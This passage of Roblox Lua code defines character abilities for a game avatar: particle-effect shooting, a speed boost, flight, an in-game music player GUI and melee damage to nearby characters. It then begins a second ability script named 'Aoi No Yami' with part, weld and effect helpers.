          NumberSequenceKeypoint.new(1, 0, 0)
        })
        s.Texture = "rbxassetid://31270182"
        s.Transparency = NumberSequence.new({
          NumberSequenceKeypoint.new(0, 0.6, 0),
          NumberSequenceKeypoint.new(0.89, 0.6, 0),
          NumberSequenceKeypoint.new(1, 1, 0)
        })
        s.Name = "vid"
        s.Acceleration = viarm.CFrame.upVector * 5
        s.Lifetime = NumberRange.new(1)
        s.ZOffset = 1
        s.Rate = 1250
        s.Speed = NumberRange.new(2, 3)
        s.VelocitySpread = 180
        s.Parent = viarm
        coroutine.resume(coroutine.create(function()
          while s do
            swait()
            s.Acceleration = viarm.CFrame.upVector * 6
          end
        end))
        coroutine.resume(coroutine.create(function()
          while torrent == true do
            swait()
            lerpz(RJ, "C0", RJC0 * cf(0, 0, 0) * ang(rd(0), rd(0), rd(0)), 0.3)
            lerpz(N, "C0", NC0 * cf(0, 0, 0) * ang(rd(0), rd(0), rd(0)), 0.3)
            lerpz(RS, "C0", RSC0 * cf(0, 0, 0) * ang(rd(0), rd(0), rd(90)), 0.3)
            lerpz(RS, "C1", RSC1 * cf(0, 0, 0) * ang(rd(0), rd(0), rd(0)), 0.3)
            lerpz(LS, "C0", LSC0 * cf(0, 0, 0) * ang(rd(0), rd(0), rd(0)), 0.3)
            lerpz(LS, "C1", LSC1 * cf(0, 0, 0) * ang(rd(0), rd(0), rd(0)), 0.3)
            lerpz(RH, "C0", RHC0 * cf(0, 0, 0) * ang(rd(0), rd(0), rd(0)), 0.3)
            lerpz(RH, "C1", RHC1 * cf(0, 0, 0) * ang(rd(0), rd(0), rd(0)), 0.3)
            lerpz(LH, "C0", LHC0 * cf(0, 0, 0) * ang(rd(0), rd(0), rd(0)), 0.3)
            lerpz(LH, "C1", LHC1 * cf(0, 0, 0) * ang(rd(0), rd(0), rd(0)), 0.3)
          end
        end))
        local shootinz = false
        hd = tool.Activated:connect(function()
          shootinz = true
          repeat
            swait(3)
            lerpz(RS, "C0", RSC0 * cf(rd2(-3, -1) / 10, 0, 0) * ang(rd(rd2(-5, 5)), rd(rd2(-5, 5)), rd(rd2(95, 105))), 0.8)
            proj(CFrame.new(viarm.Position, mouse.Hit.p + Vector3.new(rd2(-1, 1), rd2(-1, 1), 0)))
            local sd = Instance.new("Sound")
            sd.Volume = 0.3
            sd.Pitch = rd2(11, 13) / 10
            sd.SoundId = "rbxassetid://221727606"
            sd.Parent = viarm
            local sd2 = sd:Clone()
            sd2.SoundId = "rbxassetid://238381567"
            sd2.Parent = viarm
            sd:Play()
            sd2:Play()
            game.Debris:AddItem(sd, 1)
            game.Debris:AddItem(sd2, 1)
          until shootinz == false or torrent == false
        end)
        hu = tool.Deactivated:connect(function()
          shootinz = false
        end)
      end
    elseif torrent == true then
      hd:Disconnect()
      hu:Disconnect()
      torrent = false
      modz:FindFirstChild("shootingu"):FindFirstChild("vid").Enabled = false
      for _ = 1, 10 do
        swait()
        lerpz(RJ, "C0", RJC0 * cf(0, 0, 0) * ang(rd(0), rd(0), rd(0)), 0.4)
        lerpz(N, "C0", NC0 * cf(0, 0, 0) * ang(rd(0), rd(0), rd(0)), 0.4)
        lerpz(RS, "C0", RSC0 * cf(0, 0, 0) * ang(rd(0), rd(0), rd(0)), 0.4)
        lerpz(RS, "C1", RSC1 * cf(0, 0, 0) * ang(rd(0), rd(0), rd(0)), 0.4)
        lerpz(LS, "C0", LSC0 * cf(0, 0, 0) * ang(rd(0), rd(0), rd(0)), 0.4)
        lerpz(LS, "C1", LSC1 * cf(0, 0, 0) * ang(rd(0), rd(0), rd(0)), 0.4)
        lerpz(RH, "C0", RHC0 * cf(0, 0, 0) * ang(rd(0), rd(0), rd(0)), 0.4)
        lerpz(RH, "C1", RHC1 * cf(0, 0, 0) * ang(rd(0), rd(0), rd(0)), 0.4)
        lerpz(LH, "C0", LHC0 * cf(0, 0, 0) * ang(rd(0), rd(0), rd(0)), 0.4)
        lerpz(LH, "C1", LHC1 * cf(0, 0, 0) * ang(rd(0), rd(0), rd(0)), 0.4)
      end
      resetlerp()
      modz:FindFirstChild("shootingu"):Destroy()
    end
  end
  function suprfast()
    if selected == false or activu == true then
      return
    end
    activu = true
    human.WalkSpeed = human.WalkSpeed + 30
    human.JumpPower = human.JumpPower + 45
    for _, d in ipairs(chr:GetChildren()) do
      if d.ClassName == "Accessory" then
        swait()
        glow(hrp, d:FindFirstChildOfClass("Part"):FindFirstChild("Glow"), 2)
        coroutine.resume(coroutine.create(function()
          local clones = {}
          for i = 1, 5 do
            local v = d:FindFirstChildOfClass("Part"):FindFirstChild("Glow"):Clone()
            v.Name = "nyoo"
            v.vid:Destroy()
            v.vid2:Destroy()
            v.AccessoryWeld:Destroy()
            v.Weld:Destroy()
            v.Transparency = 0.9
            v.Anchored = true
            v.Parent = modz
            table.insert(clones, v)
          end
          num = 0
          repeat
            swait()
            num = num % 5 + 1
            clones[num].CFrame = d:FindFirstChildOfClass("Part"):FindFirstChild("Glow").CFrame
          until activu == false
          for _, b in ipairs(clones) do
            swait()
            b:Destroy()
          end
        end))
      elseif d.ClassName == "Part" and d ~= hrp then
        swait()
        glow(hrp, d:FindFirstChild("Glow"), 2)
        coroutine.resume(coroutine.create(function()
          local clones = {}
          for i = 1, 5 do
            local v = d:FindFirstChild("Glow"):Clone()
            v.Name = "lel"
            v.vid:Destroy()
            v.vid2:Destroy()
            v.Weld:Destroy()
            v.Transparency = 0.9
            v.Anchored = true
            v.Parent = modz
            table.insert(clones, v)
          end
          num = 0
          repeat
            swait()
            num = num % 5 + 1
            clones[num].CFrame = d:FindFirstChild("Glow").CFrame
          until activu == false
          for _, b in ipairs(clones) do
            swait()
            b:Destroy()
          end
        end))
      end
    end
    wait(2)
    activu = false
    human.WalkSpeed = human.WalkSpeed - 30
    human.JumpPower = human.JumpPower - 45
  end
  function fly()
    if selected == false or activu == true or torrent == true then
      return
    end
    local memedon = {}
    activu = true
    local emi = true
    local mp = Instance.new("Part")
    mp.Size = Vector3.new(0.2, 0.2, 0.2)
    mp.CanCollide = false
    mp.Transparency = 1
    mp.Parent = modz
    table.insert(memedon, mp)
    makeweld(mp, mp, tors, ang(rd(-30), rd(0), rd(0)) * CFrame.new(0, -0.5, -0.5), nil)
    local function pr(par, amt)
      local s = Instance.new("ParticleEmitter")
      s.Enabled = false
      s.LockedToPart = true
      s.Color = ColorSequence.new(Color3.new(0.1411764705882353, 0.9215686274509803, 0.9215686274509803))
      s.LightEmission = 0.6
      s.Size = NumberSequence.new({
        NumberSequenceKeypoint.new(0, 0.3, 0),
        NumberSequenceKeypoint.new(0.8, 0.3, 0),
        NumberSequenceKeypoint.new(1, 0, 0)
      })
      s.Texture = "rbxassetid://31270182"
      s.Transparency = NumberSequence.new({
        NumberSequenceKeypoint.new(0, 0.7, 0),
        NumberSequenceKeypoint.new(0.89, 0.7, 0),
        NumberSequenceKeypoint.new(1, 1, 0)
      })
      s.Name = "vid"
      s.Lifetime = NumberRange.new(0.75)
      s.Rate = 1
      s.Speed = NumberRange.new(10, 15)
      s.VelocitySpread = 3
      s.Parent = par
      coroutine.resume(coroutine.create(function()
        while emi do
          swait()
          s:Emit(amt)
        end
      end))
      return s
    end
    for _, d in ipairs(chr:GetChildren()) do
      if d.ClassName == "Accessory" then
        glow(hrp, d:FindFirstChildOfClass("Part"):FindFirstChild("Glow"), 1.5)
      elseif d.ClassName == "Part" and d ~= hrp then
        glow(hrp, d:FindFirstChild("Glow"), 1.5)
      end
    end
    local f1 = makepart("Teal", "w1", 1, "Neon", modz, hrp.CFrame)
    f1.Size = Vector3.new(0.4, 0.4, 0.4)
    local p1 = pr(f1, 12)
    p1.Acceleration = Vector3.new(-15, 0, 15)
    local w1 = makeweld(f1, f1, mp, CFrame.Angles(rd(-5), rd(10), rd(-50)) * CFrame.new(0.25, 0, 0), nil)
    local f2 = makepart("Teal", "w2", 1, "Neon", modz, hrp.CFrame)
    f2.Size = Vector3.new(0.4, 0.4, 0.4)
    local p2 = pr(f2, 12)
    p2.Acceleration = Vector3.new(15, 0, 15)
    local w2 = makeweld(f2, f2, mp, CFrame.Angles(rd(-5), rd(-10), rd(50)) * CFrame.new(-0.25, 0, 0), nil)
    local f3 = makepart("Teal", "w3", 1, "Neon", modz, hrp.CFrame)
    f3.Size = Vector3.new(1.3, 0.6, 0.6)
    p3 = pr(f3, 4)
    p3.Speed = NumberRange.new(10, 12)
    local w3 = makeweld(f3, f3, mp, CFrame.Angles(rd(-40), rd(10), rd(-145)) * CFrame.new(2, -1, -0.5), nil)
    local f4 = makepart("Teal", "w4", 1, "Neon", modz, hrp.CFrame)
    f4.Size = Vector3.new(1.3, 0.6, 0.6)
    p4 = pr(f4, 4)
    p4.Speed = NumberRange.new(10, 12)
    local w4 = makeweld(f4, f4, mp, CFrame.Angles(rd(-40), rd(-10), rd(145)) * CFrame.new(-2, -1, -0.5), nil)
    local f5 = makepart("Teal", "w5", 1, "Neon", modz, hrp.CFrame)
    f5.Size = Vector3.new(1.3, 0.6, 0.6)
    p5 = pr(f5, 4)
    p5.Speed = NumberRange.new(10, 12)
    local w5 = makeweld(f5, f5, mp, CFrame.Angles(rd(-30), rd(-10), rd(-115)) * CFrame.new(3, -1.75, -1), nil)
    local f6 = makepart("Teal", "w6", 1, "Neon", modz, hrp.CFrame)
    f6.Size = Vector3.new(1.3, 0.6, 0.6)
    p6 = pr(f6, 4)
    p6.Speed = NumberRange.new(10, 12)
    local w6 = makeweld(f6, f6, mp, CFrame.Angles(rd(-30), rd(10), rd(115)) * CFrame.new(-3, -1.75, -1), nil)
    local f7 = makepart("Teal", "w7", 1, "Neon", modz, hrp.CFrame)
    f7.Size = Vector3.new(1.9, 0.6, 0.6)
    p7 = pr(f7, 6)
    p7.Speed = NumberRange.new(10, 12)
    local w7 = makeweld(f7, f7, mp, CFrame.Angles(rd(-40), rd(-5), rd(-140)) * CFrame.new(2.5, -1.65, -0.65), nil)
    local f8 = makepart("Teal", "w8", 1, "Neon", modz, hrp.CFrame)
    f8.Size = Vector3.new(1.9, 0.6, 0.6)
    p8 = pr(f8, 6)
    p8.Speed = NumberRange.new(10, 12)
    local w8 = makeweld(f8, f8, mp, CFrame.Angles(rd(-40), rd(5), rd(140)) * CFrame.new(-2.5, -1.65, -0.65), nil)
    t1 = pr(f1, 2)
    t1.LockedToPart = false
    t2 = pr(f2, 2)
    t2.LockedToPart = false
    t3 = pr(f3, 2)
    t3.LockedToPart = false
    t4 = pr(f4, 2)
    t4.LockedToPart = false
    t5 = pr(f5, 2)
    t5.LockedToPart = false
    t6 = pr(f6, 2)
    t6.LockedToPart = false
    t7 = pr(f7, 2)
    t7.LockedToPart = false
    t8 = pr(f8, 2)
    t8.LockedToPart = false
    table.insert(memedon, f1)
    table.insert(memedon, f2)
    table.insert(memedon, f3)
    table.insert(memedon, f4)
    table.insert(memedon, f5)
    table.insert(memedon, f6)
    table.insert(memedon, f7)
    table.insert(memedon, f8)
    local sd = Instance.new("Sound")
    sd.Volume = 1.5
    sd.Pitch = rd2(10, 12) / 10
    sd.SoundId = "rbxassetid://201858072"
    sd.Parent = hrp
    sd:Play()
    game.Debris:AddItem(sd, 1)
    human.PlatformStand = true
    local bg = Instance.new("BodyGyro")
    bg.MaxTorque = Vector3.new(15000, 15000, 15000)
    bg.P = 2500
    bg.D = 100
    bg.CFrame = CFrame.new(hrp.Position, mouse.Hit.p)
    bg.Parent = hrp
    local bf = Instance.new("BodyVelocity")
    bf.MaxForce = Vector3.new(15000, 15000, 15000)
    bf.P = 2500
    bf.Velocity = mouse.Hit.p - hrp.Position.unit * 200
    bf.Parent = hrp
    for d = 1, 100 do
      swait()
      bg.CFrame = CFrame.new(hrp.Position, mouse.Hit.p)
      bf.Velocity = mouse.Hit.p - hrp.Position.unit * (200 - d * 2)
      lerpz(RJ, "C0", RJC0 * cf(0, 0, 0) * ang(rd(80), rd(0), math.sin(-hrp.RotVelocity.Y / 5)), 0.4)
      lerpz(N, "C0", NC0 * cf(0, 0, 0) * ang(rd(-70), rd(0), rd(0)), 0.4)
      lerpz(RS, "C0", RSC0 * cf(0, 0, 0) * ang(rd(0), rd(0), rd(0)), 0.4)
      lerpz(RS, "C1", RSC1 * cf(0, 0, 0) * ang(rd(0), rd(0), rd(0)), 0.4)
      lerpz(LS, "C0", LSC0 * cf(0, 0, 0) * ang(rd(0), rd(0), rd(0)), 0.4)
      lerpz(LS, "C1", LSC1 * cf(0, 0, 0) * ang(rd(0), rd(0), rd(0)), 0.4)
      lerpz(RH, "C0", RHC0 * cf(0, 0, 0) * ang(rd(0), rd(0), rd(0)), 0.4)
      lerpz(RH, "C1", RHC1 * cf(0, 0, 0) * ang(rd(0), rd(0), rd(0)), 0.4)
      lerpz(LH, "C0", LHC0 * cf(0, 0, 0) * ang(rd(0), rd(0), rd(0)), 0.4)
      lerpz(LH, "C1", LHC1 * cf(0, 0, 0) * ang(rd(0), rd(0), rd(0)), 0.4)
    end
    bf:Destroy()
    bg:Destroy()
    human.PlatformStand = false
    emi = false
    p1.LockedToPart = false
    p2.LockedToPart = false
    p3.LockedToPart = false
    p4.LockedToPart = false
    p5.LockedToPart = false
    p6.LockedToPart = false
    p7.LockedToPart = false
    p8.LockedToPart = false
    for _ = 1, 10 do
      swait()
      lerpz(RJ, "C0", RJC0 * cf(0, 0, 0) * ang(rd(0), rd(0), rd(0)), 0.4)
      lerpz(N, "C0", NC0 * cf(0, 0, 0) * ang(rd(0), rd(0), rd(0)), 0.4)
      lerpz(RS, "C0", RSC0 * cf(0, 0, 0) * ang(rd(0), rd(0), rd(0)), 0.4)
      lerpz(RS, "C1", RSC1 * cf(0, 0, 0) * ang(rd(0), rd(0), rd(0)), 0.4)
      lerpz(LS, "C0", LSC0 * cf(0, 0, 0) * ang(rd(0), rd(0), rd(0)), 0.4)
      lerpz(LS, "C1", LSC1 * cf(0, 0, 0) * ang(rd(0), rd(0), rd(0)), 0.4)
      lerpz(RH, "C0", RHC0 * cf(0, 0, 0) * ang(rd(0), rd(0), rd(0)), 0.4)
      lerpz(RH, "C1", RHC1 * cf(0, 0, 0) * ang(rd(0), rd(0), rd(0)), 0.4)
      lerpz(LH, "C0", LHC0 * cf(0, 0, 0) * ang(rd(0), rd(0), rd(0)), 0.4)
      lerpz(LH, "C1", LHC1 * cf(0, 0, 0) * ang(rd(0), rd(0), rd(0)), 0.4)
    end
    delay(0.5, function()
      for _, l in ipairs(memedon) do
        l:Destroy()
      end
    end)
    resetlerp()
    activu = false
  end
  function musiclel()
    if selected == false or activu == true then
      return
    end
    if boxingu == false then
      boxingu = true
      do
        local watz = 1
        local hmm = 1
        local intens = 30
        local deg = 20
        local derp = makepart("Teal", "hurr", 0.25, "Neon", modz, hrp.CFrame)
        derp.Locked = true
        local s = Instance.new("ParticleEmitter")
        s.Enabled = true
        s.LockedToPart = true
        s.Color = ColorSequence.new(Color3.new(0.1411764705882353, 0.9215686274509803, 0.9215686274509803))
        s.LightEmission = 0.6
        s.Size = NumberSequence.new({
          NumberSequenceKeypoint.new(0, 0.275, 0),
          NumberSequenceKeypoint.new(0.406, 0.762, 0),
          NumberSequenceKeypoint.new(0.433, 1.5, 0.75),
          NumberSequenceKeypoint.new(0.476, 0.625, 0),
          NumberSequenceKeypoint.new(1, 0.05, 0)
        })
        s.Texture = "rbxassetid://31270182"
        s.Transparency = NumberSequence.new({
          NumberSequenceKeypoint.new(0, 0.6, 0),
          NumberSequenceKeypoint.new(0.89, 0.6, 0),
          NumberSequenceKeypoint.new(1, 1, 0)
        })
        s.Name = "vid"
        s.Lifetime = NumberRange.new(0.2)
        s.Rate = 75
        s.Speed = NumberRange.new(7, 10)
        s.VelocitySpread = 360
        s.ZOffset = 1
        s.Parent = derp
        local s2 = Instance.new("ParticleEmitter")
        s2.Enabled = true
        s2.LockedToPart = false
        s2.Color = ColorSequence.new(Color3.new(0.1411764705882353, 0.9215686274509803, 0.9215686274509803))
        s2.LightEmission = 0.6
        s2.Size = NumberSequence.new({
          NumberSequenceKeypoint.new(0, 0, 0),
          NumberSequenceKeypoint.new(0.853, 0.125, 0.1),
          NumberSequenceKeypoint.new(1, 0, 0)
        })
        s2.Texture = "rbxassetid://31270182"
        s2.Transparency = NumberSequence.new({
          NumberSequenceKeypoint.new(0, 0.6, 0),
          NumberSequenceKeypoint.new(0.89, 0.6, 0),
          NumberSequenceKeypoint.new(1, 1, 0)
        })
        s2.Name = "vid2"
        s2.Lifetime = NumberRange.new(0.5)
        s2.Rate = 350
        s2.Speed = NumberRange.new(2, 6)
        s2.VelocitySpread = 360
        s2.ZOffset = 1
        s2.Parent = derp
        local s3 = Instance.new("ParticleEmitter")
        s3.Enabled = false
        s3.LockedToPart = false
        s3.Color = ColorSequence.new(Color3.new(0.1411764705882353, 0.9215686274509803, 0.9215686274509803))
        s3.LightEmission = 0.6
        s3.Size = NumberSequence.new({
          NumberSequenceKeypoint.new(0, 0.45, 0),
          NumberSequenceKeypoint.new(0.853, 0.25, 0.1),
          NumberSequenceKeypoint.new(1, 0, 0)
        })
        s3.Texture = "rbxassetid://31270182"
        s3.Transparency = NumberSequence.new({
          NumberSequenceKeypoint.new(0, 0.6, 0),
          NumberSequenceKeypoint.new(0.89, 0.6, 0),
          NumberSequenceKeypoint.new(1, 1, 0)
        })
        s3.Name = "vid3"
        s3.Lifetime = NumberRange.new(0.5)
        s3.Acceleration = Vector3.new(0, 30, 0)
        s3.Rate = 350
        s3.Speed = NumberRange.new(20, 30)
        s3.VelocitySpread = 360
        s3.Parent = derp
        derp.Anchored = true
        derp.Transparency = 0.5
        derp.Size = Vector3.new(3, 2, 2)
        derp.CFrame = hrp.CFrame
        local lol = makemesh("FileMesh", Vector3.new(1, 1, 1), "rbxassetid://151760030", derp)
        local sound = Instance.new("Sound")
        sound.Name = "moose"
        sound.Volume = 1
        sound.EmitterSize = 40
        sound.MaxDistance = 40
        sound.Looped = true
        sound.Parent = derp
        coroutine.resume(coroutine.create(function()
          local hey = false
          while derp do
            swait()
            watz = watz + hmm
            derp.CFrame = derp.CFrame:lerp(hrp.CFrame * cf(-1.5, 3, 2.5) * ang(0, 0, rd(deg * math.cos(watz / intens))), 0.4)
            derp.Size = derp.Size:lerp(Vector3.new(3 * (1 + sound.PlaybackLoudness / 500), 2 * (1 + sound.PlaybackLoudness / 500), 1 * (1 + sound.PlaybackLoudness / 1000)), 0.7)
            lol.Scale = lol.Scale:lerp(Vector3.new(1 * (1 + sound.PlaybackLoudness / 500), 1 * (1 + sound.PlaybackLoudness / 500), 1 * (1 + sound.PlaybackLoudness / 500)), 0.7)
            if hey == false and (3 < lol.Scale).magnitude then
              hey = true
              s3:Emit(20)
              delay(0.25, function()
                hey = false
              end)
            end
          end
        end))
        local sg = Instance.new("ScreenGui")
        sg.Name = "simpleflips"
        sg.Parent = plr.PlayerGui
        local fr = Instance.new("Frame")
        fr.AnchorPoint = Vector2.new(1, 0.5)
        fr.BackgroundColor3 = Color3.new(0.09411764705882353, 0.9568627450980393, 1)
        fr.BorderSizePixel = 2
        fr.Position = UDim2.new(0.975, 0, 0.5, 0)
        fr.Size = UDim2.new(0, 200, 0, 100)
        fr.Parent = sg
        local mbox = Instance.new("TextBox")
        mbox.AnchorPoint = Vector2.new(0.5, 0.5)
        mbox.BackgroundColor3 = Color3.new(0.45098039215686275, 0.7803921568627451, 1)
        mbox.BorderSizePixel = 2
        mbox.Position = UDim2.new(0.5, 0, 0.25, 0)
        mbox.Size = UDim2.new(0, 150, 0, 40)
        mbox.Font = "SourceSansBold"
        mbox.FontSize = "Size24"
        mbox.Text = "MEME"
        mbox.TextWrapped = true
        mbox.Parent = fr
        local pley = Instance.new("TextButton")
        pley.AnchorPoint = Vector2.new(0.5, 0.5)
        pley.BackgroundColor3 = Color3.new(0.25098039215686274, 1, 0.3137254901960784)
        pley.BorderSizePixel = 2
        pley.Position = UDim2.new(0.25, 0, 0.75, 0)
        pley.Size = UDim2.new(0, 75, 0, 35)
        pley.Font = "SourceSansBold"
        pley.FontSize = "Size18"
        pley.Text = "kappa"
        pley.Parent = fr
        local stap = Instance.new("TextButton")
        stap.AnchorPoint = Vector2.new(0.5, 0.5)
        stap.BackgroundColor3 = Color3.new(1, 0.25098039215686274, 0.11764705882352941)
        stap.BorderSizePixel = 2
        stap.Position = UDim2.new(0.75, 0, 0.75, 0)
        stap.Size = UDim2.new(0, 75, 0, 35)
        stap.Font = "SourceSansBold"
        stap.FontSize = "Size18"
        stap.Text = "pride"
        stap.Parent = fr
        pl = pley.MouseButton1Click:connect(function()
          sound.SoundId = "rbxassetid://" .. mbox.Text
          sound:Play()
        end)
        st = stap.MouseButton1Click:connect(function()
          sound:Stop()
        end)
      end
    elseif boxingu == true then
      activu = true
      boxingu = false
      local derp = modz:FindFirstChild("hurr")
      local s3 = derp:FindFirstChild("vid3")
      local s1 = derp:FindFirstChild("vid")
      local s2 = derp:FindFirstChild("vid2")
      local sound = derp:FindFirstChild("moose")
      local sg = plr.PlayerGui:FindFirstChild("simpleflips")
      pl:Disconnect()
      st:Disconnect()
      s3:Emit(40)
      s1.Enabled = false
      s2.Enabled = false
      sound:Stop()
      sg:Destroy()
      derp.Transparency = 1
      local poo = Instance.new("Sound")
      poo.SoundId = "rbxassetid://174658105"
      poo.Volume = 1.25
      poo.TimePosition = 0.65
      poo.Parent = derp
      poo:Play()
      wait(0.75)
      derp:Destroy()
      activu = false
    end
  end
  function hito(partoz, magn, dmg, debtim)
    for _, guy in pairs(workspace:GetChildren()) do
      if guy:FindFirstChild("Humanoid") and guy:FindFirstChild("Head") and guy ~= chr and magn > (guy:FindFirstChild("Head").Position - partoz.Position).magnitude and guy:FindFirstChild("Head"):FindFirstChild("alabo") == nil then
        do
          local humz = guy:FindFirstChild("Humanoid")
          local hed = guy:FindFirstChild("Head")
          humz:TakeDamage(dmg)
          local db = Instance.new("StringValue")
          db.Name = "alabo"
          db.Parent = hed
          delay(debtim, function()
            db:Destroy()
          end)
        end
      end
    end
  end
  function animo(yep)
    if yep == true then
      anim.Parent = human
      chr.Animate.Disabled = false
    elseif yep == false then
      chr.Animate.Disabled = true
      anim.Parent = nil
    end
  end
  mouse.KeyDown:connect(function(key)
    if key == "f" then
      suprfast()
    end
    if key == "q" then
      torentmod()
    end
    if key == "c" then
      fly()
    end
    if key == "e" then
      eswing()
    end
    if key == "m" then
      musiclel()
    end
  end)
  tool.Equipped:connect(function()
    selected = true
  end)
  tool.Unequipped:connect(function()
    selected = false
  end)
end}

 
 

module[1] = {"Aoi No Yami",function()
Player=game:GetService("Players").LocalPlayer
Character=Player.Character 
PlayerGui=Player.PlayerGui
Backpack=Player.Backpack 
Torso=Character.Torso 
Head=Character.Head 
Humanoid=Character.Humanoid
m=Instance.new('Model',Character)
LeftArm=Character["Left Arm"] 
LeftLeg=Character["Left Leg"] 
RightArm=Character["Right Arm"] 
RightLeg=Character["Right Leg"] 
LS=Torso["Left Shoulder"] 
LH=Torso["Left Hip"] 
RS=Torso["Right Shoulder"] 
RH=Torso["Right Hip"] 
Face = Head.face
Neck=Torso.Neck
it=Instance.new
attacktype=1
vt=Vector3.new
cf=CFrame.new
euler=CFrame.fromEulerAnglesXYZ
angles=CFrame.Angles
cloaked=false
necko=cf(0, 1, 0, -1, -0, -0, 0, 0, 1, 0, 1, 0)
necko2=cf(0, -0.5, 0, -1, -0, -0, 0, 0, 1, 0, 1, 0)
LHC0=cf(-1,-1,0,-0,-0,-1,0,1,0,1,0,0)
LHC1=cf(-0.5,1,0,-0,-0,-1,0,1,0,1,0,0)
RHC0=cf(1,-1,0,0,0,1,0,1,0,-1,-0,-0)
RHC1=cf(0.5,1,0,0,0,1,0,1,0,-1,-0,-0)
RootPart=Character.HumanoidRootPart
RootJoint=RootPart.RootJoint
RootCF=euler(-1.57,0,3.14)
attack = false 
attackdebounce = false 
deb=false
equipped=true
hand=false
MMouse=nil
combo=0
mana=0
trispeed=.2
attackmode='none'
local idle=0
local Anim="Idle"
local Effects={}
local gun=false
local shoot=false
player=nil 
mana=0

mouse=Player:GetMouse()
--save shoulders 
RSH, LSH=nil, nil 
--welds 
RW, LW=Instance.new("Weld"), Instance.new("Weld") 
RW.Name="Right Shoulder" LW.Name="Left Shoulder"
LH=Torso["Left Hip"]
RH=Torso["Right Hip"]
TorsoColor=Torso.BrickColor
function NoOutline(Part)
Part.TopSurface,Part.BottomSurface,Part.LeftSurface,Part.RightSurface,Part.FrontSurface,Part.BackSurface = 10,10,10,10,10,10
end
player=Player 
ch=Character
RSH=ch.Torso["Right Shoulder"] 
LSH=ch.Torso["Left Shoulder"] 
-- 
RSH.Parent=nil 
LSH.Parent=nil 
-- 
RW.Name="Right Shoulder"
RW.Part0=ch.Torso 
RW.C0=cf(1.5, 0.5, 0) --* CFrame.fromEulerAnglesXYZ(1.3, 0, -0.5) 
RW.C1=cf(0, 0.5, 0) 
RW.Part1=ch["Right Arm"] 
RW.Parent=ch.Torso 
-- 
LW.Name="Left Shoulder"
LW.Part0=ch.Torso 
LW.C0=cf(-1.5, 0.5, 0) --* CFrame.fromEulerAnglesXYZ(1.7, 0, 0.8) 
LW.C1=cf(0, 0.5, 0) 
LW.Part1=ch["Left Arm"] 
LW.Parent=ch.Torso 

	Player=game:GetService('Players').LocalPlayer
	Character=Player.Character
	Mouse=Player:GetMouse()
	m=Instance.new('Model',Character)


	local function weldBetween(a, b)
	    local weldd = Instance.new("ManualWeld")
	    weldd.Part0 = a
	    weldd.Part1 = b
	    weldd.C0 = CFrame.new()
	    weldd.C1 = b.CFrame:inverse() * a.CFrame
	    weldd.Parent = a
	    return weldd
	end
	
	function swait(num)
    if num==0 or num==nil then
    game:service'RunService'.Heartbeat:wait(0)
    else
    for i=0,num do
    game:service'RunService'.Heartbeat:wait(0)
    end
    end
	    end
	
	function nooutline(part)
		part.TopSurface,part.BottomSurface,part.LeftSurface,part.RightSurface,part.FrontSurface,part.BackSurface = 10,10,10,10,10,10
	end
	
	function part(formfactor,parent,material,reflectance,transparency,brickcolor,name,size)
		local fp=it("Part")
		fp.formFactor=formfactor
		fp.Parent=parent
		fp.Reflectance=reflectance
		fp.Transparency=transparency
		fp.CanCollide=false
		fp.Locked=true
		fp.BrickColor=BrickColor.new(tostring(brickcolor))
		fp.Name=name
		fp.Size=size
		fp.Position=Character.Torso.Position
		nooutline(fp)
		fp.Material=material
		fp:BreakJoints()
		return fp
	end
	
	function mesh(Mesh,part,meshtype,meshid,offset,scale)
		local mesh=it(Mesh)
		mesh.Parent=part
		if Mesh=="SpecialMesh" then
			mesh.MeshType=meshtype
			mesh.MeshId=meshid
		end
		mesh.Offset=offset
		mesh.Scale=scale
		return mesh
	end
	
	function weld(parent,part0,part1,c0,c1)
		local weld=it("Weld")
		weld.Parent=parent
		weld.Part0=part0
		weld.Part1=part1
		weld.C0=c0
		weld.C1=c1
		return weld
	end
	
	
local function CFrameFromTopBack(at, top, back)
local right = top:Cross(back)
return CFrame.new(at.x, at.y, at.z,
right.x, top.x, back.x,
right.y, top.y, back.y,
right.z, top.z, back.z)
end

function Triangle(a, b, c)
local edg1 = (c-a):Dot((b-a).unit)
local edg2 = (a-b):Dot((c-b).unit)
local edg3 = (b-c):Dot((a-c).unit)
if edg1 <= (b-a).magnitude and edg1 >= 0 then
a, b, c = a, b, c
elseif edg2 <= (c-b).magnitude and edg2 >= 0 then
a, b, c = b, c, a
elseif edg3 <= (a-c).magnitude and edg3 >= 0 then
a, b, c = c, a, b
else
assert(false, "unreachable")
end
 
local len1 = (c-a):Dot((b-a).unit)
local len2 = (b-a).magnitude - len1
local width = (a + (b-a).unit*len1 - c).magnitude
 
local maincf = CFrameFromTopBack(a, (b-a):Cross(c-b).unit, -(b-a).unit)
 
local list = {}

local Color = BrickColor.new("Dark grey")
 
if len1 > 0.01 then
local w1 = Instance.new('WedgePart', m)
game:GetService("Debris"):AddItem(w1,5)
w1.Material = "SmoothPlastic"
w1.FormFactor = 'Custom'
w1.BrickColor = BrickColor.new(Color)
w1.Transparency = 0
w1.Reflectance = 0
w1.Material = "SmoothPlastic"
w1.CanCollide = false
NoOutline(w1)
local sz = Vector3.new(0.2, width, len1)
w1.Size = sz
local sp = Instance.new("SpecialMesh",w1)
sp.MeshType = "Wedge"
sp.Scale = Vector3.new(0,1,1) * sz/w1.Size
w1:BreakJoints()
w1.Anchored = true
w1.Parent = workspace
w1.Transparency = 0.7
table.insert(Effects,{w1,"Disappear",.01})
w1.CFrame = maincf*CFrame.Angles(math.pi,0,math.pi/2)*CFrame.new(0,width/2,len1/2)
table.insert(list,w1)
end
 
if len2 > 0.01 then
local w2 = Instance.new('WedgePart', m)
game:GetService("Debris"):AddItem(w2,5)
w2.Material = "SmoothPlastic"
w2.FormFactor = 'Custom'
w2.BrickColor = BrickColor.new(Color)
w2.Transparency = 0
w2.Reflectance = 0
w2.Material = "SmoothPlastic"
w2.CanCollide = false
NoOutline(w2)
local sz = Vector3.new(0.2, width, len2)
w2.Size = sz
local sp = Instance.new("SpecialMesh",w2)
sp.MeshType = "Wedge"
sp.Scale = Vector3.new(0,1,1) * sz/w2.Size
w2:BreakJoints()
w2.Anchored = true
w2.Parent = workspace
w2.Transparency = 0.7
table.insert(Effects,{w2,"Disappear",.01})
w2.CFrame = maincf*CFrame.Angles(math.pi,math.pi,-math.pi/2)*CFrame.new(0,width/2,-len1 - len2/2)
table.insert(list,w2)
end
return unpack(list)
end
	
	
so = function(id,par,vol,pit) 
coroutine.resume(coroutine.create(function()
local sou = Instance.new("Sound",par or workspace)
sou.Volume=vol
sou.Pitch=pit or 1
sou.SoundId=id
swait() 
sou:play() 
game:GetService("Debris"):AddItem(sou,6)
end))
end
 
function clerp(a,b,t) 
